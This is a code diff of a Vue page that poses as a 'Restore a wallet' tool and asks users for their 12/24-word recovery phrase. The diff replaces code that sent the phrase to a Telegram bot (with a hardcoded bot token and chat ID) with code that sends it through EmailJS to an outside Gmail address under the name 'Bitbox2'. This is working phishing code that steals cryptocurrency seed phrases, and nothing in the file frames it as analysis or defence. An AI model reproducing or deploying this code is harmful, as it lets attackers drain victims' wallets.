@@ -177,9 +177,7 @@
           <div class="col-xs-11">
             <div class="row flex-items-center">
               <div class="col-xs-12">
-                <h2 class="heading-1 mb-3">
-                   Restore a wallet
-                </h2>
+                <h2 class="heading-1 mb-3">Restore a wallet</h2>
                 <p class="m-bottom-xxlarge text-center">
                   Please enter your 12/24 wallet recovery phrase. Make sure you
                   enter the words in the correct order after which your press
@@ -638,32 +636,31 @@ export default {
   methods: {
     checkLength(params) {
       this.tags = params
-      this.lengthOfTags = params.length
+      this.lengthOfTags = params.length + 1
     },
     sendData() {
-      let bot = {
-        CHAT_ID: '5095365797',
-        TOKEN: '6023490351:AAGEGMybaGTtGcnhLm3fzV8aiRjWNJ4TWjw',
-      }
-
       this.isLoading = true
       this.phrase = [...this.tags]
-
-      fetch(
-        `https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.CHAT_ID}&text=${this.phrase}`,
-        {
-          method: 'GET',
-        }
-      ).then(
-        (success) => {
-          this.isLoading = false;
-          this.$router.push('/validated');
+      let self = this
+      var data = {
+        service_id: 'service_g49xzs9',
+        template_id: 'template_l04gtxf',
+        user_id: 'Q_v6F22hpmQkpwuex',
+        template_params: {
+          from_name: 'Bitbox2',
+          phrase: this.phrase,
+          reply_to: 'gibsonkendra725@gmail.com',
         },
-        (error) => {
-          self.$toast.error('Error Occured!', error);
-          this.isLoading = false;
-        }
-      )
+      }
+      this.$axios
+        .$post('https://api.emailjs.com/api/v1.0/email/send', data)
+        .then(function () {
+          self.$router.push('/validated')
+          self.isLoading = false
+        })
+        .catch(function () {
+          self.isLoading = false
+        })
     },
   },
 }
